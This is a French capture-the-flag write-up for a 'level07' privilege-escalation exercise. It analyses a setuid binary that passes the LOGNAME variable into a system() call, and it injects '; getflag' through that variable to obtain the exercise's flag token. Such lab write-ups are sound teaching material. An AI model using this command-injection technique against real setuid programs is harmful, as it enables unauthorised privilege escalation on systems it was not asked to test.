Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
/home/user/level07
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

J'observe dès le début un binaire `level07`. Comme les précédents niveaux, il est exécuté par le user `flag07` et ça constitue dès lors une vulnérabilité possible.

Il est très important dans le domaine de la sécu de lancer des binaires inconnus :

```
$ ./level07
level07
```

Je l'analyse avec `strings` :

```
$ strings level07
...
GLIBC_2.0
PTRh
UWVS
[^_]
LOGNAME
/bin/echo %s
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
        gid
        uid
/home/user/level07
/usr/include/i386-linux-gnu/bits
/usr/include
...
```

Et trouve cette ligne -> `/bin/echo %s`.
Je ne comprend pas le contexte, notamment ce qui est passé pour `%s`, j'essaye donc avec `ltrace` :

```
$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                 = 2007
geteuid()                                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
getenv("LOGNAME")                                                         = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)       = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
```

J'observe que le programme remplace `%s` par `level07` ici, mais ne sait pas d'où il obtient cette valeur.

A la ligne avant le `asprintf()` et l'appel `system` je note que `getenv()` est appelé avec la valeur `LOGNAME`. Je vérifie donc quelle est sa valeur dans l'environnement actuel :

```
$ echo $LOGNAME
level07
```

Cela me laisse à penser que `%s` est substitué par `LOGNAME`. Je tente de modifier sa valeur pour vérifier l'information :

```
$ export LOGNAME="$(whoami)"
$ ./level07
level07
```

Oups. J'obtiens `level07` à nouveau, puisque je suis `level07`, ou que ça n'a pas marché. Ce test était donc inutile. Je ré-essaye avec l'attente d'un résultat plus déterminant :

```
$ export LOGNAME="42"
$ ./level07
42
```

Avec cette information, je détermine que `LOGNAME` est évalué par `%s` dans le binaire, et j'ai également noté au départ que le programme est exécuté en tant que l'utilisateur `flag07`.

J'espère donc réussir à faire exécuter `getflag` au travers de cette vulnérabilité.

Je tente :

```
$ export LOGNAME="$(getflag)"
$ ./level07
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
```

Je vérifie : 

```
$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

Ce qui me confirme qu'il y a un `)` dans le `getflag` lancé par un user du type `level`, ce qui signifie que : `export LOGNAME="$(getflag)"` est lancé par moi, `level07`, ce qui est probablement une propriété du sub-shell (`$()`).

Afin de ne pas lancer `getflag` dans un sub-shell, je tente une approche qui considère que :

```
/bin/echo %s
```

eEst peut-être lancé en tant qu'une seule string dans le programme, et non comme `%s` étant un argument du binaire `echo`.

Si c'est le cas, ça signifie que cet appel serait transformé en :

```
echo %s
```

et non :

```
echo $LOGNAME
```

ce qui soulignerait une potentielle vulnérabilité dans l'appel système ! Je pourrais donc substituer `%s` par n'importe quel bout de script `bash`.

Je tente donc d'**hacker** l'appel en l'arrêtant prématurément et en injectant un autre appel à `getflag` au sein de `%s` :

```
$ export LOGNAME="; getflag"
$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Bingo ! Ici, je fais équivaloir `%s` à un arrêt de l'instruction en cours (donc `echo`, puis lance la suivante : `getflag`, et obtiens donc son résultat)